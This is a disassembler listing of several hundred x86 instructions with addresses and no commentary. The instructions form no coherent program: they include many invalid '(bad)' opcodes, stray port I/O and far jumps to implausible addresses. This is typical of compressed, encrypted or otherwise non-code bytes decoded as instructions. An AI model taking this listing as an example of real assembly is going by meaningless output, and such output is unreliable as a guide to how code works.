  41b9da:	fdiv   DWORD PTR [ebx+0x409d12d4]
  41b9e0:	shr    BYTE PTR [edi-0x22],1
  41b9e3:	ror    BYTE PTR [ebx],cl
  41b9e5:	pop    esi
  41b9e6:	push   es
  41b9e7:	dec    edi
  41b9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ea:	pushf  
  41b9eb:	push   esi
  41b9ec:	int3   
  41b9ed:	push   esi
  41b9ee:	mov    ds:0x1a1e8b68,eax
  41b9f3:	es adc eax,0xba90793a
  41b9f9:	aaa    
  41b9fa:	scas   al,BYTE PTR es:[edi]
  41b9fb:	jecxz  0x41b9d1
  41b9fd:	inc    ebx
  41b9fe:	dec    esp
  41b9ff:	lock rcl bh,1
  41ba02:	ss mov eax,0xd1d703ee
  41ba08:	push   esp
  41ba09:	inc    ecx
  41ba0a:	push   ss
  41ba0b:	mov    edx,DWORD PTR [esi+0x52e41b89]
  41ba11:	xor    eax,0x35502483
  41ba16:	mov    esp,0x6c164050
  41ba1b:	mov    al,ds:0xa14e1b7c
  41ba20:	xlat   BYTE PTR ds:[ebx]
  41ba21:	std    
  41ba22:	out    0x93,al
  41ba24:	enter  0x23ea,0xab
  41ba28:	dec    DWORD PTR [edx]
  41ba2a:	inc    esp
  41ba2b:	test   DWORD PTR [edx-0x49c6942d],ebx
  41ba31:	mov    esi,0xc3c65ee0
  41ba36:	sub    BYTE PTR [ecx+eiz*2-0x41],bh
  41ba3a:	scas   eax,DWORD PTR es:[edi]
  41ba3b:	inc    esi
  41ba3c:	mov    dh,0x93
  41ba3e:	inc    eax
  41ba3f:	stos   DWORD PTR es:[edi],eax
  41ba40:	and    eax,0xf9f4c0ba
  41ba45:	stos   DWORD PTR es:[edi],eax
  41ba46:	out    0xa0,al
  41ba48:	jmp    esi
  41ba4a:	push   cs
  41ba4b:	inc    eax
  41ba4c:	(bad)  
  41ba4e:	jmp    0x441252a4
  41ba53:	inc    eax
  41ba54:	sub    al,BYTE PTR [eax]
  41ba56:	push   0x115b7306
  41ba5b:	push   esi
  41ba5c:	notrack call DWORD PTR [edx+0x3c]
  41ba60:	jge    0x41ba28
  41ba62:	mov    esi,0xfabac274
  41ba67:	aaa    
  41ba68:	adc    al,0x5e
  41ba6a:	sbb    dh,ah
  41ba6c:	mov    dh,0x10
  41ba6e:	xor    BYTE PTR [ebx-0x35],ah
  41ba71:	je     0x41bab9
  41ba73:	or     eax,0x1a4a55ee
  41ba78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba79:	jb     0x41baaf
  41ba7b:	jnp    0x41bae8
  41ba7d:	xchg   ebp,eax
  41ba7e:	iret   
  41ba7f:	push   es
  41ba80:	pop    esp
  41ba81:	shl    cl,cl
  41ba83:	or     DWORD PTR [ebx+0x6b],edi
  41ba86:	ja     0x41ba95
  41ba88:	adc    bl,dh
  41ba8a:	mov    ds:0xf718045f,al
  41ba8f:	test   ebp,0x5248c163
  41ba95:	sbb    DWORD PTR [ebx+0x9],esi
  41ba98:	dec    ecx
  41ba99:	xor    BYTE PTR [ecx-0x55],bl
  41ba9c:	es or  al,0xeb
  41ba9f:	add    eax,0x2b97118f
  41baa4:	dec    eax
  41baa5:	fsubr  QWORD PTR [esi-0x1a]
  41baa8:	mov    esp,0x88714688
  41baad:	test   DWORD PTR [ebp+ebp*1-0x2083701],edi
  41bab4:	push   ebp
  41bab5:	outs   dx,BYTE PTR ds:[esi]
  41bab6:	and    ebp,0x6734d9a7
  41babc:	in     al,dx
  41babd:	xchg   esp,eax
  41babe:	xchg   DWORD PTR [eax-0x35a4a0ba],esi
  41bac4:	scas   eax,DWORD PTR es:[edi]
  41bac5:	data16 shl BYTE PTR [edx+0x7e],1
  41bac9:	out    0x86,al
  41bacb:	or     DWORD PTR cs:[ecx+0x42],esp
  41bacf:	js     0x41bb1a
  41bad1:	mov    bh,0x90
  41bad3:	mov    ds:0x18557181,al
  41bad8:	mov    edx,DWORD PTR [ecx+0x1b]
  41badb:	iret   
  41badc:	or     esp,DWORD PTR [edx-0x2d3d3d8c]
  41bae2:	stos   DWORD PTR es:[edi],eax
  41bae3:	lds    eax,FWORD PTR [eax+0xe]
  41bae6:	lock inc edi
  41bae8:	lahf   
  41bae9:	iret   
  41baea:	retf   0xcfbd
  41baed:	in     eax,dx
  41baee:	add    BYTE PTR [ebx+0x21],ch
  41baf1:	popf   
  41baf2:	inc    edx
  41baf3:	lahf   
  41baf4:	fmul   DWORD PTR [ebx+edi*4-0x5df3a093]
  41bafb:	pop    ecx
  41bafc:	push   edi
  41bafd:	xchg   esp,eax
  41bafe:	leave  
  41baff:	jnp    0x41ba9e
  41bb01:	and    BYTE PTR [ebp-0x7d],ah
  41bb04:	nop
  41bb05:	scas   al,BYTE PTR es:[edi]
  41bb06:	fadd   DWORD PTR [ebp-0x3]
  41bb09:	mov    edx,ds
  41bb0b:	add    ebp,eax
  41bb0d:	jle    0x41bb42
  41bb0f:	int    0x39
  41bb11:	inc    ecx
  41bb12:	stos   DWORD PTR es:[edi],eax
  41bb13:	fdiv   QWORD PTR [esi]
  41bb15:	adc    bl,BYTE PTR [edi+esi*1+0x2b08dc20]
  41bb1c:	jp     0x41bb2b
  41bb1e:	daa    
  41bb1f:	pop    ds
  41bb20:	or     eax,0xf46a7867
  41bb25:	push   esp
  41bb26:	inc    edx
  41bb27:	or     bl,BYTE PTR [ebp-0x57]
  41bb2a:	sbb    al,0x7c
  41bb2c:	daa    
  41bb2d:	xchg   ebx,eax
  41bb2e:	cli    
  41bb2f:	xchg   esp,eax
  41bb30:	mov    ebx,0xd1ca52a2
  41bb35:	call   0x9659948d
  41bb3a:	jecxz  0x41bbb1
  41bb3c:	ret    
  41bb3d:	enter  0xaba5,0x3b
  41bb41:	(bad)  
  41bb42:	ffree  st(5)
  41bb44:	lds    edi,FWORD PTR [ebx+0x28]
  41bb47:	mov    al,ds:0x4972b27b
  41bb4c:	and    BYTE PTR [esi-0x62],bh
  41bb4f:	retf   
  41bb50:	aad    0x11
  41bb52:	jo     0x41bb94
  41bb54:	pushf  
  41bb55:	and    ch,BYTE PTR ds:[edi]
  41bb58:	cmc    
  41bb59:	jno    0x41bb7d
  41bb5b:	je     0x41baff
  41bb5d:	lods   al,BYTE PTR ds:[esi]
  41bb5e:	cs rcl esi,cl
  41bb61:	or     ebx,DWORD PTR [eax-0x6709aa52]
  41bb67:	add    eax,0xab07b9b2
  41bb6c:	test   DWORD PTR [eax],0xdb47be29
  41bb72:	jnp    0x41bb12
  41bb74:	fcmove st,st(4)
  41bb76:	popf   
  41bb77:	ds pop ebp
  41bb79:	(bad)  
  41bb7a:	scas   eax,DWORD PTR es:[edi]
  41bb7b:	push   eax
  41bb7c:	push   edx
  41bb7d:	outs   dx,DWORD PTR ds:[esi]
  41bb7e:	mov    cl,0xfa
  41bb80:	and    ebx,DWORD PTR ds:0xf7411650
  41bb86:	mov    ecx,DWORD PTR es:[eax]
  41bb89:	popa   
  41bb8a:	repnz mov eax,ds:0xeae9434d
  41bb90:	jnp    0x41bbe8
  41bb92:	mov    ds:0x854c2054,al
  41bb97:	retf   0xf66e
  41bb9a:	lods   eax,DWORD PTR ds:[esi]
  41bb9b:	out    dx,al
  41bb9c:	jmp    0xb452:0xb2f66034
  41bba3:	lods   al,BYTE PTR ds:[esi]
  41bba4:	fldcw  WORD PTR [ebp-0x1e0e4ad4]
  41bbaa:	sahf   
  41bbab:	inc    edi
  41bbac:	leave  
  41bbad:	sbb    eax,0xb7eb8aeb
  41bbb2:	das    
  41bbb3:	mov    ebp,0xff6d69dc
  41bbb8:	jmp    0x41bc1c
  41bbba:	adc    eax,0xb91864eb
  41bbbf:	stos   BYTE PTR es:[edi],al
  41bbc0:	imul   eax,DWORD PTR [ebp+0x6a],0xa6b844
  41bbc7:	push   edi
  41bbc8:	and    al,0xc9
  41bbca:	mov    ebp,esi
  41bbcc:	xor    edx,ebx
  41bbce:	aas    
  41bbcf:	xchg   ebp,eax
  41bbd0:	and    BYTE PTR [edx+esi*2],dh
  41bbd3:	mov    ecx,0xa580a3f3
  41bbd8:	xchg   BYTE PTR [esi],cl
  41bbda:	mov    dh,0xd1
  41bbdc:	mov    BYTE PTR [ecx+0x75],al
  41bbdf:	stos   DWORD PTR es:[edi],eax
  41bbe0:	inc    edx
  41bbe1:	mov    bh,0x34
  41bbe3:	mov    cl,0x79
  41bbe5:	std    
  41bbe6:	loope  0x41bc39
  41bbe8:	dec    ecx
  41bbe9:	pusha  
  41bbea:	inc    ecx
  41bbeb:	(bad)  
  41bbed:	popa   
  41bbee:	xor    eax,0x3d3107c
  41bbf3:	ds mov edi,0x7abb84e5
  41bbf9:	adc    DWORD PTR [eax+edx*1+0x2438b786],ecx
  41bc00:	and    ebp,DWORD PTR [esi]
  41bc02:	or     bh,BYTE PTR [ecx+0x3d]
  41bc05:	mov    edx,0x57e1320b
  41bc0a:	sahf   
  41bc0b:	adc    DWORD PTR [esp+edi*4],ebp
  41bc0e:	pop    edx
  41bc0f:	(bad)  
  41bc10:	sbb    al,BYTE PTR ds:0xf427be8f
  41bc16:	inc    esp
  41bc17:	repz jbe 0x41bc55
  41bc1a:	retf   
  41bc1b:	out    0xc8,eax
  41bc1d:	inc    esp
  41bc1e:	and    dh,BYTE PTR [eax-0x6a]
  41bc21:	call   DWORD PTR [ebx-0x7ea2c7d]
  41bc27:	bound  esp,QWORD PTR [eax-0x23]
  41bc2a:	lods   eax,DWORD PTR ds:[esi]
  41bc2b:	pop    esp
  41bc2c:	scas   eax,DWORD PTR es:[edi]
  41bc2d:	dec    esp
  41bc2e:	mov    ds:0x8dad16ca,al
  41bc33:	jns    0x41bbf1
  41bc35:	es xchg ebx,eax
  41bc37:	hlt    
  41bc38:	scas   al,BYTE PTR es:[edi]
  41bc39:	or     al,0x1d
  41bc3b:	sbb    eax,0x37c1adc0
  41bc40:	imul   ebp,edx,0xa96c2f8e
  41bc46:	(bad)  
  41bc47:	call   0xf16ef264
  41bc4c:	pushf  
  41bc4d:	rol    BYTE PTR [esi+0x4c97d25b],cl
  41bc53:	add    DWORD PTR [edi+0x4a],0x650df8bf
  41bc5a:	or     DWORD PTR [ecx],ebx
  41bc5c:	and    eax,0xef6832ef
  41bc61:	and    ebx,DWORD PTR [ebx-0x6e]
  41bc64:	into   
  41bc65:	inc    edi
  41bc66:	popf   
  41bc67:	lea    esi,[ebx-0x3ca960c3]
  41bc6d:	xlat   BYTE PTR ds:[ebx]
  41bc6e:	dec    eax
  41bc6f:	icebp  
  41bc70:	dec    edi
  41bc71:	pop    edx
  41bc72:	or     al,0x75
  41bc74:	in     al,0x26
  41bc76:	sub    BYTE PTR [ebp-0x32],0xd4
  41bc7a:	pop    ss
  41bc7b:	ror    BYTE PTR [ebx],1
  41bc7d:	(bad)
  41bc80:	or     esi,ebx
  41bc82:	loope  0x41bc8d
  41bc84:	repnz icebp 
  41bc86:	mov    ebx,0x82f7bd
  41bc8b:	addr16 jmp 0x1d7fe60e
  41bc91:	(bad)  
  41bc92:	(bad)  
  41bc94:	adc    eax,0xa5222f23
  41bc99:	icebp  
  41bc9a:	and    al,0x80
  41bc9c:	pushf  
  41bc9d:	mov    DWORD PTR [ecx],edx
  41bc9f:	mov    ch,BYTE PTR [ecx]
  41bca1:	fcomp  st(0)
  41bca3:	jmp    0x41bc75
  41bca5:	push   ebp
  41bca6:	sub    cl,ah
  41bca8:	sbb    al,0x16
  41bcaa:	xor    DWORD PTR [edi],0xffffffd8
  41bcad:	sbb    BYTE PTR [esi+0x59],ch
  41bcb0:	xor    DWORD PTR [ebx+0x2a],esi
  41bcb3:	mov    cl,0x1a
  41bcb5:	jl     0x41bcf0
  41bcb7:	dec    esi
  41bcb8:	(bad)  
  41bcb9:	je     0x41bc6f
  41bcbb:	push   ss
  41bcbc:	sbb    eax,esi
  41bcbe:	sbb    ch,dl
  41bcc0:	jb     0x41bd31
  41bcc2:	mov    esi,DWORD PTR [edi+0x28]
  41bcc5:	mov    al,0x4c
  41bcc7:	ss imul esi,ebx,0xef3b921e
  41bcce:	pusha  
  41bccf:	mov    ds:0xcb8e5a44,al
  41bcd4:	lods   al,BYTE PTR ds:[esi]
  41bcd5:	es das 
  41bcd7:	fwait
  41bcd8:	xor    DWORD PTR [edi+ebp*1-0x4705c29b],0x9dfe338c
  41bce3:	jmp    0xdb9b6120
  41bce8:	and    BYTE PTR [edx],ch
  41bcea:	popa   
  41bceb:	fdivr  DWORD PTR [edi]
  41bced:	stos   DWORD PTR es:[edi],eax
  41bcee:	outs   dx,BYTE PTR ds:[esi]
  41bcef:	dec    DWORD PTR [edx]
  41bcf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcf2:	ret    0x198d
  41bcf5:	dec    edx
  41bcf6:	outs   dx,DWORD PTR ds:[esi]
  41bcf7:	dec    edx
  41bcf8:	fcomp  QWORD PTR [ebx-0x5f]
  41bcfb:	call   0x2fba5591
  41bd00:	scas   al,BYTE PTR es:[edi]
  41bd01:	jmp    0x41bca0
  41bd03:	jo     0x41bcb5
  41bd05:	test   eax,0xc4b5e5e3
  41bd0a:	out    dx,eax
  41bd0b:	stos   BYTE PTR es:[edi],al
  41bd0c:	xor    al,0xc1
  41bd0e:	dec    ebp
  41bd0f:	sub    ecx,ebx
  41bd11:	mov    WORD PTR [edi+edx*2],fs
  41bd14:	cmp    dh,ch
  41bd16:	xor    DWORD PTR [ecx],ecx
  41bd18:	jbe    0x41bd90
  41bd1a:	pop    ds
  41bd1b:	cmp    eax,0xefc7b01b
  41bd20:	dec    edi
  41bd21:	mov    ch,BYTE PTR es:[esi]
  41bd24:	cmp    eax,0x5ec31a1e
  41bd29:	mov    dl,0xae
  41bd2b:	mov    eax,ds:0x7fe8ffca
  41bd30:	inc    esp
  41bd31:	je     0x41bcd6
  41bd33:	clc    
  41bd34:	push   ss
  41bd35:	dec    edi
  41bd36:	push   es
  41bd37:	mov    eax,ds:0x24c986f4
  41bd3c:	pop    ss
  41bd3d:	mov    esi,0x4271cee3
  41bd42:	xchg   esp,eax
  41bd43:	repz push 0x2759ad7
  41bd49:	pop    esi
  41bd4a:	mov    DWORD PTR [edx-0x5f3756f7],0xd01a95e0
  41bd54:	jbe    0x41bd0f
  41bd56:	sbb    al,0x65
  41bd58:	(bad)  
  41bd59:	lahf   
  41bd5a:	stc    
  41bd5b:	adc    eax,DWORD PTR [edx]
  41bd5d:	xchg   ecx,eax
  41bd5e:	mov    eax,0xdebaa176
  41bd63:	sub    bh,BYTE PTR [edi]
  41bd65:	push   0x9b36e2cb
  41bd6a:	int3   
  41bd6b:	fisub  WORD PTR [edx-0x1f]
  41bd6e:	ror    BYTE PTR [eax+0x35c16c30],cl
  41bd74:	xchg   ebx,eax
  41bd75:	mov    dl,0x7b
  41bd77:	pop    eax
  41bd78:	mov    ds:0x559301d4,al
  41bd7d:	cmp    esi,DWORD PTR [eax]
  41bd7f:	inc    esi
  41bd80:	imul   ebx,DWORD PTR [ebx+0x68],0xffffffcd
  41bd84:	(bad)  
  41bd85:	push   edi
  41bd86:	adc    al,0x33
  41bd88:	cli    
  41bd89:	jae    0x41bd6e
  41bd8b:	and    eax,0x1169b5c4
  41bd90:	nop
  41bd91:	push   eax
  41bd92:	push   ecx
  41bd93:	add    eax,0x9ca849ba
  41bd98:	mov    ah,0xec
  41bd9a:	pop    ds
  41bd9b:	or     ebx,DWORD PTR [esi+ecx*4]
  41bd9e:	mov    ch,0xb1
  41bda0:	pop    ebx
  41bda1:	shl    DWORD PTR [eax+0xae66602],cl
  41bda7:	jmp    0xa3e0:0x5e99ca29
  41bdae:	pop    edx
  41bdaf:	or     ebp,DWORD PTR [edi+0x1a]
  41bdb2:	sahf   
  41bdb3:	dec    eax
  41bdb4:	aaa    
  41bdb5:	push   esp
  41bdb6:	enter  0x9d49,0x61
  41bdba:	in     eax,0xd7
  41bdbc:	adc    DWORD PTR [esi],eax
  41bdbe:	xchg   esp,eax
  41bdbf:	push   edx
  41bdc0:	int    0x71
  41bdc2:	(bad)  
  41bdc3:	cdq    
  41bdc4:	bound  eax,QWORD PTR [edi+0x52e04b44]
  41bdca:	lahf   
  41bdcb:	aas    
  41bdcc:	lock push eax
  41bdce:	sub    DWORD PTR es:[ebp-0x41],0xfffffff6
  41bdd3:	mov    bl,0xf8
  41bdd5:	mov    bl,0x62
  41bdd7:	xchg   esi,eax
  41bdd8:	push   ebx
  41bdd9:	hlt    
  41bdda:	xor    al,0x45
  41bddc:	lock xor DWORD PTR [ebx+0x15],esi
  41bde0:	pop    ecx
  41bde1:	cmp    ch,BYTE PTR [edi-0xdc72a23]
  41bde7:	add    BYTE PTR [ebx+0x341969cd],0x26
  41bdee:	jl     0x41bda4
  41bdf0:	pop    esp
  41bdf1:	xchg   dh,dh
  41bdf3:	fcmovne st,st(7)
  41bdf5:	jp     0x41be15
  41bdf7:	adc    al,0xb6
  41bdf9:	or     edi,DWORD PTR [eax-0x10]
  41bdfc:	mov    bl,0x6f
  41bdfe:	imul   ebx,DWORD PTR ds:0x4286e6a6,0x47209781
  41be08:	or     cl,BYTE PTR ss:[edi-0x18]
  41be0c:	add    BYTE PTR [ebp+0x3af4d89d],bl
  41be12:	mov    ch,0x3a
  41be14:	addr16 int3 
  41be16:	mov    esi,DWORD PTR [ebp-0xacd2152]
  41be1c:	xchg   BYTE PTR [ebx+0x5e4aa18d],ch
  41be22:	mov    dh,0xb3
  41be24:	in     eax,dx
  41be25:	loopne 0x41be87
  41be27:	dec    edx
  41be28:	cmp    al,0x8e
  41be2a:	pop    ds
  41be2b:	adc    eax,0xf00ff6b9
  41be30:	ret    0xb0bc
  41be33:	sti    
  41be34:	ins    DWORD PTR es:[edi],dx
  41be35:	gs jecxz 0x41be0f
  41be38:	xchg   ecx,eax
  41be39:	outs   dx,BYTE PTR ds:[esi]
  41be3a:	dec    esi
  41be3b:	test   eax,0x21c40dcc
  41be40:	ins    BYTE PTR es:[edi],dx
  41be41:	test   edx,0xb63f5255
  41be47:	es jecxz 0x41be6a
  41be4a:	mov    ecx,0xbf3af3f1
  41be4f:	push   ebp
  41be50:	mov    cl,0x60
  41be52:	shr    DWORD PTR [ebx],cl
  41be54:	test   eax,0x8eef6eb3
  41be59:	and    dl,dh
  41be5b:	shl    DWORD PTR [edx-0x2c],1
  41be5e:	or     dh,BYTE PTR [edx+0x77]
  41be61:	mov    eax,0x7b76e618
  41be66:	xchg   ecx,eax
  41be67:	leave  
  41be68:	inc    eax
  41be69:	or     al,0x3e
  41be6b:	dec    edx
  41be6c:	clc    
  41be6d:	ss sub eax,0x9c0270a5
  41be73:	mov    edx,0x900e3a02
  41be78:	adc    ebx,DWORD PTR [eax]
  41be7a:	push   ss
  41be7b:	and    BYTE PTR [edi+0x22230c81],al
  41be81:	fild   DWORD PTR [eax]
  41be83:	add    BYTE PTR [eax],0xea
  41be86:	pop    DWORD PTR [ecx]
  41be88:	xchg   esi,eax
  41be89:	xor    eax,0x999a889c
  41be8e:	sub    esi,ebx
  41be90:	mov    ch,0x8b
  41be92:	jnp    0x41be72
  41be94:	inc    ebp
  41be95:	cmp    DWORD PTR [ebp+edx*4+0x5c6b470f],edi
  41be9c:	fwait
  41be9d:	stos   BYTE PTR es:[edi],al
  41be9e:	push   ebx
  41be9f:	xor    bh,BYTE PTR [eax+0x27]
  41bea2:	fwait
  41bea3:	out    0x93,al
  41bea5:	cdq    
  41bea6:	es scas al,BYTE PTR es:[edi]
  41bea8:	jge    0x41beea
  41beaa:	push   cs
  41beab:	push   ebx
  41beac:	xor    eax,0x2f3ee49f
  41beb1:	shr    BYTE PTR [eax-0x338bce82],1
  41beb7:	or     ah,bl
  41beb9:	xor    BYTE PTR [edi+ebx*8],ah
  41bebc:	pop    edx
  41bebd:	push   cs
  41bebe:	and    eax,0x3a69bf44
  41bec3:	aaa    
  41bec4:	outs   dx,DWORD PTR ds:[esi]
  41bec5:	cli    
  41bec6:	push   edx
  41bec7:	jo     0x41bf10
  41bec9:	inc    edi
  41beca:	fwait
  41becb:	imul   ebp,DWORD PTR [edx-0x68],0xffffffbe
  41becf:	and    eax,0x52342e57
  41bed4:	mov    al,0x91
  41bed6:	cld    
  41bed7:	rcl    eax,1
  41bed9:	inc    ebx
  41beda:	test   DWORD PTR [ecx-0x7d],ebx
  41bedd:	mov    esp,0xd88c742
  41bee2:	mov    ebp,0x28c9de9d
  41bee7:	lock rcr BYTE PTR [ecx+0x79],1
  41beeb:	fwait
  41beec:	add    BYTE PTR [edi+0x1c8f2abf],dh
  41bef2:	pop    ds
  41bef3:	aam    0xb4
  41bef5:	adc    BYTE PTR [eax+0x7],ah
  41bef8:	leave  
  41bef9:	adc    ch,dl
  41befb:	ror    DWORD PTR [ebp+ebx*8-0x3c],cl
  41beff:	retf   0x3e47
  41bf02:	(bad)  
  41bf03:	in     al,dx
  41bf04:	cmc    
  41bf05:	lock push ebp
  41bf07:	inc    ecx
  41bf08:	aad    0x32
  41bf0a:	test   DWORD PTR [esi],edx
  41bf0c:	mov    ds:0xfed2e58a,eax
  41bf11:	push   ebx
  41bf12:	in     eax,dx
  41bf13:	push   cs
  41bf14:	jne    0x41bf05
  41bf16:	xchg   BYTE PTR [ebp+0x5e0c9445],dh
  41bf1c:	jmp    0xa670:0x4238fb09
  41bf23:	popa   
  41bf24:	jne    0x41bf0b
  41bf26:	retf   
  41bf27:	push   ebp
  41bf28:	ins    DWORD PTR es:[edi],dx
  41bf29:	push   ebp
  41bf2a:	aas    
  41bf2b:	ffreep st(2)
  41bf2d:	pushf  
  41bf2e:	mov    fs,WORD PTR [edx-0x2d]
  41bf31:	mov    al,ds:0xb86f3212
  41bf36:	dec    edi
  41bf37:	pop    ebp
  41bf38:	push   ebp
  41bf39:	fiadd  DWORD PTR [edi+0x17]
  41bf3c:	jns    0x41bec4
  41bf3e:	ins    BYTE PTR es:[edi],dx
  41bf3f:	mov    ds:0xfdaec815,al
  41bf44:	mov    ebp,DWORD PTR [edx+0x66b7d77b]
  41bf4a:	shl    DWORD PTR [ebx-0x4f],cl
  41bf4d:	into   
  41bf4e:	(bad)  
  41bf4f:	ror    BYTE PTR [eax],0xc6
  41bf52:	out    0x6e,eax
  41bf54:	retf   0x60f9
  41bf57:	test   eax,0x84a0da27
  41bf5c:	dec    ebp
  41bf5d:	rcl    esi,1
  41bf5f:	mov    al,0xe2
  41bf61:	es inc ebp
  41bf63:	add    al,0xbb
  41bf65:	bound  ebx,QWORD PTR [ecx-0x75]
  41bf68:	dec    edi
  41bf69:	pop    eax
  41bf6a:	cmp    BYTE PTR [eax+edi*1+0x2ef1025a],bl
  41bf71:	fwait
  41bf72:	idiv   BYTE PTR [ebx+0x3a58f211]
  41bf78:	jbe    0x41bf06
  41bf7a:	jns    0x41bfc8
  41bf7c:	pusha  
  41bf7d:	nop
  41bf7e:	mov    ah,BYTE PTR [edx+ecx*2-0x68]
  41bf82:	sbb    dh,cl
  41bf84:	inc    edx
  41bf85:	pop    ebp
  41bf86:	and    eax,0xaee98b4d
  41bf8b:	pusha  
  41bf8c:	in     eax,dx
  41bf8d:	pushf  
  41bf8e:	sti    
  41bf8f:	cmp    dl,al
  41bf91:	in     al,dx
  41bf92:	mov    al,ds:0x6144f6ca
  41bf97:	and    esi,ebx
  41bf99:	push   cs
  41bf9a:	jecxz  0x41bff5
  41bf9c:	leave  
  41bf9d:	mov    DWORD PTR [ebp+0x3050184e],ecx
  41bfa3:	int3   
  41bfa4:	lock sub eax,0x110fb36c
  41bfaa:	jae    0x41bf47
  41bfac:	mov    ecx,0xd56cdba8
  41bfb1:	daa    
  41bfb2:	test   DWORD PTR [ecx+0x71],esp
  41bfb5:	and    eax,0xe737e85b
  41bfba:	mov    DWORD PTR [edx-0x29],ecx
  41bfbd:	loope  0x41bf4c
  41bfbf:	test   al,0x10
  41bfc1:	sub    eax,0x522c558e
  41bfc6:	inc    esp
  41bfc7:	ficom  DWORD PTR [edi-0xa97296]
  41bfcd:	addr16 push esi
  41bfcf:	inc    esp
  41bfd0:	ficom  DWORD PTR [ecx+0x7d]
  41bfd3:	mov    BYTE PTR [esi-0x205c8791],bh
  41bfd9:	sub    dl,BYTE PTR [edx-0x3]
  41bfdc:	jns    0x41bf9a
  41bfde:	and    ch,al
  41bfe0:	jmp    0x41c05a
  41bfe2:	call   0xa48a34ab
  41bfe7:	fwait
  41bfe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfe9:	in     al,dx
  41bfea:	icebp  
  41bfeb:	outs   dx,DWORD PTR ds:[esi]
  41bfec:	leave  
  41bfed:	xchg   ebp,eax
  41bfee:	imul   edx,DWORD PTR [ebx-0x2d],0xd038f161
  41bff5:	iret   
  41bff6:	aam    0x2e
  41bff8:	push   eax
  41bff9:	ret    0xea49
  41bffc:	pop    ds
  41bffd:	add    BYTE PTR [edx],dl
  41bfff:	xchg   ebx,eax
  41c000:	pop    ss
  41c001:	fldenv [ebx+0x3b]
  41c004:	nop
  41c005:	pushf  
  41c006:	pushf  
  41c007:	(bad)
  41c00a:	or     DWORD PTR [ecx],esi
  41c00c:	ins    BYTE PTR es:[edi],dx
  41c00d:	cmp    bh,BYTE PTR [edx+0x36a669b9]
  41c013:	push   ebx
  41c014:	xchg   esp,eax
  41c015:	inc    ecx
  41c016:	aaa    
  41c017:	fisttp QWORD PTR [edx+0x73]
  41c01a:	and    BYTE PTR [eax+eax*2+0x668427c8],bh
  41c021:	stc    
  41c022:	ret    0xf501
  41c025:	pop    ecx
  41c026:	xchg   ebp,eax
  41c027:	and    bl,BYTE PTR [edx]
  41c029:	push   0xcf8b9dc1
  41c02e:	stos   BYTE PTR es:[edi],al
  41c02f:	adc    al,0xe6
  41c031:	mov    dl,0xbf
  41c033:	xor    esp,DWORD PTR [ebx+0x4d8ed2a3]
  41c039:	xchg   bh,al
  41c03b:	push   edx
  41c03c:	xchg   ah,dl
  41c03e:	int    0x6b
  41c040:	dec    edi
  41c041:	add    BYTE PTR [edi-0x53ad2224],bl
  41c047:	dec    ecx
  41c048:	jle    0x41c02a
  41c04a:	sub    esi,DWORD PTR [edx-0x6]
  41c04d:	addr16 pop esp
  41c04f:	mov    cl,0x1a
  41c051:	push   ebx
  41c052:	sbb    ch,BYTE PTR [ebx]
  41c054:	dec    edx
  41c055:	dec    edx
  41c056:	adc    DWORD PTR [ebp-0x79309967],ebp
  41c05c:	jns    0x41c018
  41c05e:	and    edi,DWORD PTR [edx-0x51]
  41c061:	xchg   edx,eax
  41c062:	rcl    BYTE PTR [eax-0x4528ec75],1
  41c068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c069:	(bad)  
  41c06a:	and    DWORD PTR [eax-0x4b],ebp
  41c06d:	or     ch,BYTE PTR [ecx+0x49b7c4eb]
  41c073:	and    bh,BYTE PTR [ecx-0x4d530592]
  41c079:	loop   0x41c0bd
  41c07b:	rol    dh,0x9b
  41c07e:	rcr    DWORD PTR [ebx+0x10],1
  41c081:	popfw  
  41c083:	int    0x3b
  41c085:	enter  0x901e,0x1c
  41c089:	popa   
  41c08a:	fdiv   st(6),st
  41c08c:	or     ebx,DWORD PTR [ecx-0x65323889]
  41c092:	mov    eax,ds:0x632e5fcf
  41c097:	imul   esp,ebx,0xffffffcb
  41c09a:	push   edx
  41c09b:	movd   mm6,DWORD PTR [esi]
  41c09e:	repnz leave 
  41c0a0:	jns    0x41c0ec
  41c0a2:	iret   
  41c0a3:	adc    ch,ah
  41c0a5:	dec    edx
  41c0a6:	sbb    eax,0x1af0307d
  41c0ab:	jns    0x41c0d4
  41c0ad:	inc    edi
  41c0ae:	add    bl,BYTE PTR [esi+0x2d]
  41c0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0b2:	mov    al,0xad
  41c0b4:	push   ebx
  41c0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0b6:	sub    dl,BYTE PTR [edx+eax*1]
  41c0b9:	gs add al,0xf7
  41c0bc:	jae    0x41c0eb
  41c0be:	jle    0x41c09a
  41c0c0:	add    DWORD PTR [ecx-0x57],esp
  41c0c3:	dec    edx
  41c0c4:	dec    esi
  41c0c5:	inc    edx
  41c0c6:	scas   al,BYTE PTR es:[edi]
  41c0c7:	cli    
  41c0c8:	mov    eax,ds:0x904d217b
  41c0cd:	cli    
  41c0ce:	sub    eax,0xd4bfc6f8
  41c0d3:	loopne 0x41c0f0
  41c0d5:	int3   
  41c0d6:	div    BYTE PTR [ecx]
  41c0d8:	push   ss
  41c0d9:	xchg   ebp,eax
  41c0da:	loopne 0x41c07e
  41c0dc:	add    DWORD PTR [ecx+0x4f],edi
  41c0df:	jmp    0x8f83:0xeef58b9e
  41c0e6:	imul   ecx,DWORD PTR [edi],0xe4a94f7f
  41c0ec:	ret    0x9cff
  41c0ef:	push   eax
  41c0f0:	imul   BYTE PTR [edx+ebp*4-0xff78a48]
  41c0f7:	aad    0xd4
  41c0f9:	mov    ds:0x95e2a32c,eax
  41c0fe:	push   ecx
  41c0ff:	addr16 leave 
  41c101:	into   
  41c102:	sbb    cl,BYTE PTR [edx+0x19091968]
  41c108:	(bad)  
  41c109:	cdq    
  41c10a:	mov    DWORD PTR [edx-0x44],0xbd4341bb
  41c111:	dec    ecx
  41c112:	mov    WORD PTR [edi],es
  41c114:	shl    BYTE PTR [ebx-0x36b87dd1],cl
  41c11a:	cmp    bl,BYTE PTR [edx-0x1c]
  41c11d:	ja     0x41c0dd
  41c11f:	jae    0x41c0f6
  41c121:	mul    DWORD PTR [esi-0x1a75cadf]
  41c127:	int    0x82
